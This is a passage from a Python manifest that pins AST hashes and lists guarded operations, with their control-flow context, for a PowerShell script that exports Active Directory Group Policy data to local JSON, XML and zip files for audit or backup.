        # AssignmentStatementAst @ 0.1.3.0.1.2
        "0.1.3.0.1.2": ("3a50de7dd8c80e09a2c3f28123c47b7db74d466e7f7efd9226d66cfcef8181f4"),
        # TryStatementAst @ 0.1.3.0.1.3
        "0.1.3.0.1.3": ("3fd1a568410cb6e872881d6ac51dd048bb262f534bb1f84b7d4797ec229f019f"),
        # AssignmentStatementAst @ 0.1.3.0.1.3.0.0
        "0.1.3.0.1.3.0.0": ("3b3b7faaafb6397220b55b2c0f57ce1760699cb5d4493254e28e0a692430e773"),
        # AssignmentStatementAst @ 0.1.3.0.1.3.0.1
        "0.1.3.0.1.3.0.1": ("24b7fa44725bfec11d3f1cbddc5740b1a2c1449a98d4f010422507c5e1d20a4c"),
        # IfStatementAst @ 0.1.3.0.1.3.0.2
        "0.1.3.0.1.3.0.2": ("d490c9ff5f29a19c208ac86881d022004c22fe16a14587203de65d5182f30bf3"),
        # AssignmentStatementAst @ 0.1.3.0.1.3.0.2.1.0
        "0.1.3.0.1.3.0.2.1.0": ("f789e863c3f158816382d1c868f36976dc3588e1e1f161acd83656ead58a554b"),
        # AssignmentStatementAst @ 0.1.3.0.1.3.0.2.1.1
        "0.1.3.0.1.3.0.2.1.1": ("d58c4d16fed2b6461410fb0c480743a38a36f20a26c6ad5da9d0bb1f1941b141"),
        # IfStatementAst @ 0.1.3.0.1.3.0.2.1.2
        "0.1.3.0.1.3.0.2.1.2": ("1ac8eb9ddeca8383fc84ecabc884fbf79230390e2523c67ade682fbd6abb9d06"),
        # IfStatementAst @ 0.1.3.0.1.3.0.2.1.2.1.0
        "0.1.3.0.1.3.0.2.1.2.1.0": (
            "ed4ae1461edd3bca6c86e6827ec8e49c4008037568627368ad4c747b366a8183"
        ),
        # ThrowStatementAst @ 0.1.3.0.1.3.0.2.1.2.1.0.1.0
        "0.1.3.0.1.3.0.2.1.2.1.0.1.0": (
            "558cdc30062fbafbce712029654c7764f98fb366007102b8261693662f8d47f8"
        ),
        # PipelineAst @ 0.1.3.0.1.3.0.2.1.2.1.1
        "0.1.3.0.1.3.0.2.1.2.1.1": (
            "c9ca0a150ea77c97b3591bab1788e8deb6bb78adfc8a6815e57d6fd7580091f2"
        ),
        # TryStatementAst @ 0.1.3.0.1.3.0.3
        "0.1.3.0.1.3.0.3": ("d70ac2f3c8eb1664d4fe3be49200a20d1a7e71053b473bee21fd1f56281d1078"),
        # PipelineAst @ 0.1.3.0.1.3.0.3.0.0
        "0.1.3.0.1.3.0.3.0.0": ("cac4f283bae7b234a659658a882c2a34ff440a507c4447699a02a705d61eadae"),
        # PipelineAst @ 0.1.3.0.1.3.0.3.0.1
        "0.1.3.0.1.3.0.3.0.1": ("a42ad6f496aa4d31f0102f0d9cb05ab597b776b73228768fb836a3514f9af88e"),
        # IfStatementAst @ 0.1.3.0.1.3.0.3.1.0.0
        "0.1.3.0.1.3.0.3.1.0.0": (
            "2e09d01ddb91ba93f05def9203568d7937b38091d7ea49d96776579002bbe5f3"
        ),
        # PipelineAst @ 0.1.3.0.1.3.0.3.1.0.0.1.0
        "0.1.3.0.1.3.0.3.1.0.0.1.0": (
            "1c8d970031aafcd2fded798532f8efd1637a19d56c6528480369e7c70cfb8fdf"
        ),
        # PipelineAst @ 0.1.3.0.1.3.0.3.1.0.0.2.0
        "0.1.3.0.1.3.0.3.1.0.0.2.0": (
            "c4a8d78e804b268c473c15ec76da3975005ab98dc181a4a13ece2b3a89c648b3"
        ),
        # ThrowStatementAst @ 0.1.3.0.1.3.0.3.1.0.1
        "0.1.3.0.1.3.0.3.1.0.1": (
            "291edcb6074039453b3f62a4794743050d9dc40483619ba67ea5a92b87ec4cdd"
        ),
        # PipelineAst @ 0.1.3.0.1.3.1.0
        "0.1.3.0.1.3.1.0": ("2715b3bdbf63aa26641288e59c2b82e5ed9030e3af3095857109983f0ca70b50"),
        # IfStatementAst @ 0.1.4
        "0.1.4": ("97b627e3612e8af8a0f808e1c2ed08576066117c988fd32e372bf11b5dca4278"),
        # AssignmentStatementAst @ 0.1.4.1.0
        "0.1.4.1.0": ("b87288e37e03d0ee9e7f77100586aa5c3576e86881bd822ab26ea7430e9157f4"),
        # IfStatementAst @ 0.1.4.1.1
        "0.1.4.1.1": ("1904b332733ab244e8f8bd8a7503297074f515fe43a7d349d71f382213ce917e"),
        # IfStatementAst @ 0.1.4.1.1.1.0
        "0.1.4.1.1.1.0": ("0fd06e2eea373cce43c545b55bcc52c29a67f8e4ad4be52c449546dbdbc09cac"),
        # PipelineAst @ 0.1.4.1.1.1.0.1.0
        "0.1.4.1.1.1.0.1.0": ("b89c55e78768f42d3f3210fee9d288e5ead0bb52356ba7a68342e641a550c03e"),
        # PipelineAst @ 0.1.4.1.1.1.0.1.1
        "0.1.4.1.1.1.0.1.1": ("95793b63ce8191d2197af8e82781370caf5d4cc785d2529369e7664d0b89d310"),
        # ReturnStatementAst @ 0.1.4.1.1.1.1
        "0.1.4.1.1.1.1": ("639e83c2db1da11cf71e9fa3ae700006774f57f0e44fe031b92fbb747c66f569"),
        # AssignmentStatementAst @ 0.1.4.1.2
        "0.1.4.1.2": ("6a83dac0ce2b53aec4ebb60fda205ac0dd5e498e2a76697b415ef8a96e0440c5"),
        # IfStatementAst @ 0.1.4.1.3
        "0.1.4.1.3": ("be92eadefdd8f83bdb5c0e34094771c25310e321a97d545563189c3def32da87"),
        # ThrowStatementAst @ 0.1.4.1.3.1.0
        "0.1.4.1.3.1.0": ("e09fafbf74637ca76c8d442c9c10af9d3dc3532fd6f0462a39d419223043b4f6"),
        # AssignmentStatementAst @ 0.1.4.1.4
        "0.1.4.1.4": ("e6facadea26cbef3b244d23eb30759cbea39297a9a4325f8cc486d0923cbaedb"),
        # AssignmentStatementAst @ 0.1.4.1.5
        "0.1.4.1.5": ("75462ecec59b72790a1eee0f82c8a5cecf2ae328a0e35358969a9df4d7f42fc7"),
        # AssignmentStatementAst @ 0.1.4.1.6
        "0.1.4.1.6": ("7f4f9b29266b1af5299c42e18a7b2e3c9f47d81281977c69da5b0ad313a89c03"),
        # AssignmentStatementAst @ 0.1.4.1.7
        "0.1.4.1.7": ("4868f35e4848c3dc2943ca0e7e1468e516d4471d92d09c4155143dd9cca9e215"),
        # IfStatementAst @ 0.1.4.1.8
        "0.1.4.1.8": ("e38c0c0b44e875795141554c4bb4615329db9a104c7a77c3f0fccf78662d4e40"),
        # AssignmentStatementAst @ 0.1.4.1.8.1.0
        "0.1.4.1.8.1.0": ("8f69613bc38712587a2900b16bde7b2836c03808e760e9805db37087c83bc1d6"),
        # IfStatementAst @ 0.1.4.1.9
        "0.1.4.1.9": ("14d6440e2a3b6c657c6ae43be9db28b95aaa8f9f67905fb3b4b5dae195a57b25"),
        # AssignmentStatementAst @ 0.1.4.1.9.1.0
        "0.1.4.1.9.1.0": ("35033e670e4c7da25e88c13c326d8f04675328c040082da8fa566bd5ea42f9ae"),
        # AssignmentStatementAst @ 0.1.4.1.10
        "0.1.4.1.10": ("f89c6b8c5a2e3d9cace1e86e1d36bb1f3093699276e21c247e1bfe2a09c0b02e"),
        # PipelineAst @ 0.1.4.1.10.1.1.0
        "0.1.4.1.10.1.1.0": ("4a28b966122c2208bd67d3ea7fd881aab39b6544c52a2f75b890a7af48367489"),
        # PipelineAst @ 0.1.4.1.10.1.2.0
        "0.1.4.1.10.1.2.0": ("ea027f37aa4949407f613bca335dc4b10080ae52fdcf5034d600ac4fae21e1e5"),
        # IfStatementAst @ 0.1.4.1.11
        "0.1.4.1.11": ("94d07e835877e91256bcd02114c8807ca87da3d87b7c8f5486c2c6d181f2023b"),
        # ReturnStatementAst @ 0.1.4.1.11.1.0
        "0.1.4.1.11.1.0": ("92aab8033aa3b53462d55712b1450b7c94be7fe72e936ff66a9248a57d0da14c"),
        # AssignmentStatementAst @ 0.1.4.1.12
        "0.1.4.1.12": ("d0d513340d2c685656f5d4e4536366dc1a2f247709435b63d1813c503c2e42a1"),
        # AssignmentStatementAst @ 0.1.4.1.13
        "0.1.4.1.13": ("fcba7cec7efd0cdbb3846fbeb8c144666a77300bf3179927f576bb5e3b203a5a"),
        # PipelineAst @ 0.1.4.1.13.1.1.0
        "0.1.4.1.13.1.1.0": ("cad4459f6e0facbacb8eb9ce734f52a5aab64e53f8a8bc8295d99fc7e0621dcd"),
        # PipelineAst @ 0.1.4.1.13.1.2.0
        "0.1.4.1.13.1.2.0": ("6d69a810031d985dd090eb5261ed9610778772f40033dfd8a8b33527e664f38d"),
        # AssignmentStatementAst @ 0.1.4.1.14
        "0.1.4.1.14": ("6597311b931cffbb8b3ff16018746cd8feeac1c784f8b6b2b78d87b78a938579"),
        # AssignmentStatementAst @ 0.1.4.1.15
        "0.1.4.1.15": ("08e1d3ee8aeb5e82d1613b1636367256e9deb52878cc5742b8bddb8a34757d4f"),
        # AssignmentStatementAst @ 0.1.4.1.16
        "0.1.4.1.16": ("e83c4c74f729d3c17f30dc24b6fe6a4d0e34f49aa5a5e5426646f299a8e7d18c"),
        # AssignmentStatementAst @ 0.1.4.1.17
        "0.1.4.1.17": ("c036a7a1756f9e2512e978949e059a3c9797ca76d473fa1f4974d90771c219ef"),
        # IfStatementAst @ 0.1.4.1.18
        "0.1.4.1.18": ("f076d1d204caaeaa17da162feae6c63c87c8b658a70f47797d4832632f43d378"),
        # IfStatementAst @ 0.1.4.1.18.1.0
        "0.1.4.1.18.1.0": ("5ff4456a87c08c85b4c8b6ba67420b2c0d68d179561635474a9fc271055d872a"),
        # AssignmentStatementAst @ 0.1.4.1.18.1.0.1.0
        "0.1.4.1.18.1.0.1.0": ("79e69b3dca7b6ced37772e641caa9cc821c5ca2f6f312981851a5b44664350e0"),
        # IfStatementAst @ 0.1.4.1.18.1.1
        "0.1.4.1.18.1.1": ("554e58cd4e1817ffb5b2f38bbd44a9e0f60b8739128b94c266f083d02571b6f8"),
        # ThrowStatementAst @ 0.1.4.1.18.1.1.1.0
        "0.1.4.1.18.1.1.1.0": ("4d2464ecd1d3451c7a686ef55ab4a0c9d4dfe44e543e8cd0965876f62ac0ae83"),
        # AssignmentStatementAst @ 0.1.4.1.18.1.2
        "0.1.4.1.18.1.2": ("7ea04045c8949e1df1b202afe8149c954bf309d7a80956b238bfc0ce2ba1bf28"),
        # TryStatementAst @ 0.1.4.1.19
        "0.1.4.1.19": ("f74bd90da61ebf5a4df6025355ae7f68d4a321e189e0180e9db572a4a7e0a59c"),
        # PipelineAst @ 0.1.4.1.19.0.0
        "0.1.4.1.19.0.0": ("1ee44210ceaa4d91f60a2af4880eff9dcbdbd64e98107a83d54056545602f089"),
        # IfStatementAst @ 0.1.4.1.19.0.0.0.7.0.0.0
        "0.1.4.1.19.0.0.0.7.0.0.0": (
            "0d2d90b9a15c83d1e9541687b161922d243f625457c9712ef0a7d040ac1b3549"
        ),
        # PipelineAst @ 0.1.4.1.19.0.0.0.7.0.0.0.1.0
        "0.1.4.1.19.0.0.0.7.0.0.0.1.0": (
            "312e799d19c6142badab90ddec55a26e9ce24bd5d3d9b0c80e6a77a9052e854b"
        ),
        # PipelineAst @ 0.1.4.1.19.0.0.0.7.0.0.0.2.0
        "0.1.4.1.19.0.0.0.7.0.0.0.2.0": (
            "a114fdd6f41de5a2fc6be8454b3bf9da3d22c8cdbd0b560c9cfafad09f1c0291"
        ),
        # AssignmentStatementAst @ 0.1.4.1.19.1.0
        "0.1.4.1.19.1.0": ("2e7e3b24d0e678d4053d040ac971c1d770c99b17dcf2e81ff582db827149db98"),
        # AssignmentStatementAst @ 0.1.4.1.19.1.1
        "0.1.4.1.19.1.1": ("3868213249409fbbed5319cbdb67ff9b1eb5c1dec741c914d3c48f0200499e1d"),
        # PipelineAst @ 0.1.4.1.20
        "0.1.4.1.20": ("21282ebd26981e3ac398de47296ac2c84ea3b0044835902ba9f6a1220fa8bd36"),
        # PipelineAst @ 0.1.4.1.21
        "0.1.4.1.21": ("8ec0bd0224e73a317f83a012e3e1b2ca8ecbd7b6b1220dff2e0c93a3bde95e5c"),
        # PipelineAst @ 0.1.4.1.22
        "0.1.4.1.22": ("e9298e45f1021a505fd8a8f571c8c6bb482c868bf72fcedcc3e54c152647f9e1"),
        # PipelineAst @ 0.1.4.1.23
        "0.1.4.1.23": ("c0cefc832515cc25ad7c2e6c7153fef8cf5fcbdf33f6b785da183f0145706602"),
        # PipelineAst @ 0.1.4.1.23.0.1.1.0.0
        "0.1.4.1.23.0.1.1.0.0": (
            "8e71b18ae1a8baf98149490b49b8cf147b9f7ea3d88227eed6dd0b1b1f681097"
        ),
        # IfStatementAst @ 0.1.4.1.24
        "0.1.4.1.24": ("8fd540c2e6f05cab57214b240ef6b4c348f0db98b77494bb61c18b72c45446d1"),
        # PipelineAst @ 0.1.4.1.24.1.0
        "0.1.4.1.24.1.0": ("e550983d34226f7dcf53c1e85a381dec681519c027e02cd1de0c43575a0ddf46"),
        # PipelineAst @ 0.1.4.1.25
        "0.1.4.1.25": ("8d8878b5456fb09b7d49b9edf2717e4e7db90c3d66df9194237324b0ee4018ca"),
    },
}


# Pinned write/exec operations with their control-flow context (see
# check_guarded_ops). Each entry is (normalized operation text, context from
# outermost to innermost).
GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
    "Export-GpoEstate.ps1": (
        (
            "Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop",
            ("function New-GpoExportZip",),
        ),
        (
            "Test-Path -LiteralPath $archive",
            (
                "function New-GpoExportZip",
                "try",
                "if-condition after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $archive -Force -ErrorAction Stop",
            (
                "function New-GpoExportZip",
                "try",
                "if (Test-Path -LiteralPath $archive) after []",
            ),
        ),
        (
            (
                "Get-ChildItem -LiteralPath $ExportPath -Recurse -File ` -ErrorAction "
                "SilentlyContinue -ErrorVariable +zipEnumErr"
            ),
            (
                "function New-GpoExportZip",
                "try",
            ),
        ),
        (
            'Write-Host "Done: $archive ($($diskFiles.Count) files)"',
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
            ),
        ),
        (
            "Test-Path -LiteralPath $archive",
            (
                "function New-GpoExportZip",
                "catch []",
                "if-condition after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $archive -Force -ErrorAction Stop",
            (
                "function New-GpoExportZip",
                "catch []",
                "if (Test-Path -LiteralPath $archive) after []",
            ),
        ),
        (
            "Get-Module -ListAvailable -Name $mod",
            (
                "foreach ($mod in @('GroupPolicy','ActiveDirectory'))",
                "if-condition after []",
            ),
        ),
        (
            "Write-Error \"Required module '$mod' is not available. Install RSAT.\"",
            (
                "foreach ($mod in @('GroupPolicy','ActiveDirectory'))",
                "if (-not (Get-Module -ListAvailable -Name $mod)) after []",
            ),
        ),
        (
            "Test-Path -LiteralPath $OutputRoot",
            (
                "try",
                "if-condition after []",
            ),
        ),
        (
            "New-Item -ItemType Directory -Force -Path $OutputRoot",
            (
                "try",
                "if (-not (Test-Path -LiteralPath $OutputRoot)) after []",
            ),
        ),
        (
            "Out-Null",
            (
                "try",
                "if (-not (Test-Path -LiteralPath $OutputRoot)) after []",
            ),
        ),
        (
            'Join-Path $OutputRoot "_writetest_.tmp"',
            ("try",),
        ),
        (
            "Remove-Item $testFile -Force",
            ("try",),
        ),
        (
            "Write-Error \"OutputRoot '$OutputRoot' is not writable: $($_.Exception.Message)\"",
            ("catch []",),
        ),
        (
            "Get-ADDomain",
            (),
        ),
        (
            'Get-Date -Format "yyyyMMdd-HHmmss"',
            (),
        ),
        (
            'Join-Path $OutputRoot "$($dom.DNSRoot)-$stamp"',
            (),
        ),
        (
            "Get-GPO -All",
            (),
        ),
        (
            "Get-ADOrganizationalUnit -Filter *",
            (),
        ),
        (
            (
                "Get-ADObject -Filter \"objectClass -eq 'msWMI-Som'\" -Properties "
                "'msWMI-Name' -ErrorAction SilentlyContinue"
            ),
            (),
        ),
        (
            (
                "Get-ADObject -SearchBase "
                '"CN=Sites,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter '
                '"(objectClass=site)" -ErrorAction SilentlyContinue'
            ),
            (),
        ),
        (
            "Get-ADRootDSE",
            (),
        ),
        (
            "Get-ChildItem $src -Recurse -File -ErrorAction SilentlyContinue",
            (
                "if ($DryRun) after []",
                "if (-not $SkipSysvol) after []",
            ),
        ),
        (
            "Measure-Object -Property Length -Sum",
            (
                "if ($DryRun) after []",
                "if (-not $SkipSysvol) after []",
            ),
        ),
        (
            'Write-Host "DryRun: would export the following:"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " Domain: $($dom.DNSRoot)"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " GPOs: $gpoCount"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " OUs: $ouCount"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " WMI filters: $wmiCount"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " AD sites: $siteCount"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " Output dir: $out"',
            ("if ($DryRun) after []",),
        ),
        (
            "Write-Host \" SYSVOL: $(if ($SkipSysvol) {'skipped'} else {$sysvolSizeStr})\"",
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " Zip: $(if ($NoZip) {\'skipped\'} else {"$out.zip"})"',
            ("if ($DryRun) after []",),
        ),
        (
            "New-Item -ItemType Directory -Force -Path (Join-Path $out 'reports')",
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Join-Path $out 'reports'",
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Out-Null",
            ("guard if ($DryRun) -> return",),
        ),
        (
            'Write-Host "Exporting $($dom.DNSRoot) -> $out"',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Write-Progress -Activity $Activity -PercentComplete $pct",
            (
                "guard if ($DryRun) -> return",
                "function Set-SectionProgress",
            ),
        ),
        (
            'Set-SectionProgress -Activity "GPO settings (XML reports)" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            (
                "Get-GPOReport -All -ReportType Xml -Path (Join-Path $out 'AllGPOs.xml') "
                "-ErrorAction Stop"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'AllGPOs.xml'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Warning "Combined GPO report failed: $($_.Exception.Message)"',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            (
                'Write-Progress -Activity "GPO settings (XML reports)" ` -Status "$i / '
                '$gpoCount" -PercentComplete ([math]::Round(($sectionNum - 1 + ($i / '
                "$gpoCount)) / $totalSections * 100))"
            ),
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
            ),
        ),
        (
            (
                "Get-GPOReport -Guid $gpo.Id -ReportType Xml ` -Path (Join-Path $out "
                '"reports\\${safe}__$($gpo.Id).xml") -ErrorAction Stop'
            ),
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "try",
            ),
        ),
        (
            'Join-Path $out "reports\\${safe}__$($gpo.Id).xml"',
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "try",
            ),
        ),
        (
            (
                "Write-Warning \"GPO report failed for '$($gpo.DisplayName)' ($($gpo.Id)): "
                '$($_.Exception.Message)"'
            ),
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "catch []",
            ),
        ),
        (
            (
                "Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                '"(objectClass=groupPolicyContainer)" ` -Properties displayName -ErrorAction '
                "Stop"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            (
                "ForEach-Object { [pscustomobject]@{ Id = $_.Name.Trim('{}'); DisplayName = "
                "$_.displayName } }"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'gpo-inventory.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'gpo-inventory.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            (
                'Write-Warning "Inaccessible GPO detected: $guid$(if ($gpc.displayName) { " '
                '($($gpc.displayName))" })"'
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gpc in $allGpc)",
                "if (-not $knownIds.Contains($guid)) after []",
            ),
        ),
        (
            'Write-Warning "GPC completeness cross-check failed: $($_.Exception.Message)"',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "if ($collectionErrors.Count -eq 0) after []",
            ),
        ),
        (
            "Join-Path $out 'collection-errors.json'",
            (
                "guard if ($DryRun) -> return",
                "if ($collectionErrors.Count -eq 0) after []",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "else of [($collectionErrors.Count -eq 0)]",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "else of [($collectionErrors.Count -eq 0)]",
            ),
        ),
        (
            "Join-Path $out 'collection-errors.json'",
            (
                "guard if ($DryRun) -> return",
                "else of [($collectionErrors.Count -eq 0)]",
            ),
        ),
        (
            'Set-SectionProgress -Activity "GPO metadata" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            (
                "Select-Object DisplayName, Id, GpoStatus, CreationTime, ModificationTime, "
                "@{n='UserDSVersion';e={$_.User.DSVersion}}, "
                "@{n='UserSysvolVersion';e={$_.User.SysvolVersion}}, "
                "@{n='ComputerDSVersion';e={$_.Computer.DSVersion}}, "
                "@{n='ComputerSysvolVersion';e={$_.Computer.SysvolVersion}}, "
                "@{n='WmiFilter';e={$_.WmiFilter.Name}}"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'gpo-metadata.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'gpo-metadata.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Set-SectionProgress -Activity "Inheritance (gp-inheritance)" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Get-ADOrganizationalUnit -Filter *",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Select-Object -Expand DistinguishedName",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Get-GPInheritance -Target $t",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "try",
            ),
        ),
        (
            "Select-Object DisplayName, GpoId, Enabled, Enforced, Order, Target",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "try",
            ),
        ),
        (
            'Write-Warning "GPInheritance failed for $t : $($_.Exception.Message)"',
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "catch []",
            ),
        ),
        (
            "ConvertTo-Json -Depth 6",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'gp-inheritance.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'gp-inheritance.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Set-SectionProgress -Activity "OU tree" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Get-ADOrganizationalUnit -Filter * -Properties gPLink, gPOptions",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Select-Object DistinguishedName, Name, gPLink, gPOptions",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'ou-tree.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'ou-tree.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Set-SectionProgress -Activity "AD sites" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Get-ADRootDSE",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            (
                'Get-ADObject -SearchBase "CN=Sites,$configNC" -LDAPFilter '
                '"(objectClass=site)" ` -Properties gPLink, gPOptions, name'
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Select-Object DistinguishedName, Name, gPLink, gPOptions",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'sites.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'sites.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Set-SectionProgress -Activity "WMI filters" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            (
                "Get-ADObject -Filter \"objectClass -eq 'msWMI-Som'\" -Properties "
                "'msWMI-Name', 'msWMI-Parm2'"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Select-Object @{n='Name';e={$_.'msWMI-Name'}}, @{n='Query';e={$_.'msWMI-Parm2'}}",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'wmi-filters.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'wmi-filters.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Set-SectionProgress -Activity "Principals (SID -> name)" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            (
                "Get-ChildItem -LiteralPath (Join-Path $out 'reports') -Filter '*.xml' "
                "-ErrorAction SilentlyContinue"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'reports'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'AllGPOs.xml'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Test-Path -LiteralPath $allXmlPath",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if-condition after []",
            ),
        ),
        (
            "Get-Item -LiteralPath $allXmlPath",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if (Test-Path -LiteralPath $allXmlPath) after []",
            ),
        ),
        (
            "Get-Content -LiteralPath $f.FullName -Raw -ErrorAction Stop",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($f in $xmlFiles)",
                "try",
            ),
        ),
        (
            "Join-Path $out 'gpo-metadata.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Test-Path -LiteralPath $metaPath",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if-condition after []",
            ),
        ),
        (
            "Get-Content -LiteralPath $metaPath -Raw",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if (Test-Path -LiteralPath $metaPath) after []",
                "try",
            ),
        ),
        (
            'Write-Host " Found $($allSids.Count) unique SIDs to resolve"',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Sort-Object",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($sid in ($allSids | Sort-Object))",
            ),
        ),
        (
            "New-Object System.Security.Principal.SecurityIdentifier($sid)",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($sid in ($allSids | Sort-Object))",
                "try",
            ),
        ),
        (
            "Where-Object { $_ -match '^S-1-5-21-' -and $principals[$_].type -eq 'Unresolved' }",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Host " Resolving $($domainSids.Count) domain SIDs via Get-ADObject..."',
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
            ),
        ),
        (
            (
                "Get-ADObject -Filter \"objectSid -eq '$sid'\" -Properties objectClass, "
                "sAMAccountName, name -ErrorAction Stop"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                "try",
            ),
        ),
        (
            "Get-Date -Format 'o'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 5",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'principals.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'principals.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Host " Resolved: $resolved, Unresolved: $unresolved"',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Warning "Principals collection failed: $($_.Exception.Message)"',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
